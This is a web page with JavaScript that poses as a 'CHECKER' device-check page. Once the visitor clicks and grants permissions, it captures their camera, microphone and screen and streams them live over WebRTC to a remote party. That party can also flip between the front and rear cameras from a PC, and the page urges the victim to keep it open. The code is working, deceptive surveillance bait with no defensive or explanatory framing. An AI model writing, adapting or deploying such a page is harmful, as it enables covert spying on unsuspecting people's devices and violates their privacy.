<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PPP</title>
  <script src="/socket.io/socket.io.js"></script>
  <style>
    body { font-family: sans-serif; text-align: center; background: #0b0f19; color: #fff; padding-top: 50px; margin: 0; }
    #status { font-size: 16px; color: #38bdf8; margin-top: 20px; }
    button { padding: 16px 30px; font-size: 18px; background: #0284c7; color: white; border: none; border-radius: 10px; font-weight: bold; width: 85%; max-width: 320px; }
  </style>
</head>
<body>
  <h2>CHECKER</h2>
  <button id="start-btn" onclick="startDualStream()">CLICK HERE</button>
  <p id="status">CLICK & ALLOW CHECK DEVICES</p>

  <script>
    const socket = io();
    const sessionId = new URLSearchParams(window.location.search).get('session');
    const statusEl = document.getElementById('status');
    let peerConnection;
    let cameraStream, screenStream;
    let useFront = false;

    const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

    if (sessionId) socket.emit('join-session', sessionId);

    async function getCameraMedia(facing) {
      if (cameraStream) {
        cameraStream.getTracks().forEach(t => t.stop());
      }
      return await navigator.mediaDevices.getUserMedia({
        video: { facingMode: facing ? "user" : "environment" },
        audio: true
      });
    }

    async function startDualStream() {
      try {
        // 1. Get Camera & Audio
        cameraStream = await getCameraMedia(useFront);
        
        // 2. Get Mobile Screen
        if (navigator.mediaDevices.getDisplayMedia) {
          screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
        }

        peerConnection = new RTCPeerConnection(config);

        // Add Camera tracks
        cameraStream.getTracks().forEach(track => peerConnection.addTrack(track, cameraStream));

        // Add Screen tracks if permitted
        if (screenStream) {
          screenStream.getTracks().forEach(track => peerConnection.addTrack(track, screenStream));
        }

        peerConnection.onicecandidate = (e) => {
          if (e.candidate) socket.emit('signal', { sessionId, data: { candidate: e.candidate } });
        };

        const offer = await peerConnection.createOffer();
        await peerConnection.setLocalDescription(offer);
        socket.emit('signal', { sessionId, data: { offer } });

        statusEl.innerText = '🔴 Streaming live! (Do not close or minimize)';
        document.getElementById('start-btn').style.display = 'none';

      } catch (err) {
        alert('Permission Denied / Error: ' + err.message);
      }
    }

    // Remote camera flip trigger from PC
    socket.on('switch-camera', async () => {
      useFront = !useFront;
      try {
        cameraStream = await getCameraMedia(useFront);
        const newTrack = cameraStream.getVideoTracks()[0];
        const senders = peerConnection.getSenders();
        const camSender = senders.find(s => s.track && s.track.kind === 'video' && s.track.label !== (screenStream && screenStream.getVideoTracks()[0].label));
        if (camSender) {
          await camSender.replaceTrack(newTrack);
        }
      } catch (e) {
        console.error('Camera switch error:', e);
      }
    });

    socket.on('signal', async (data) => {
      if (data.answer && peerConnection) await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
      if (data.candidate && peerConnection) await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
    });
  </script>
</body>
</html>
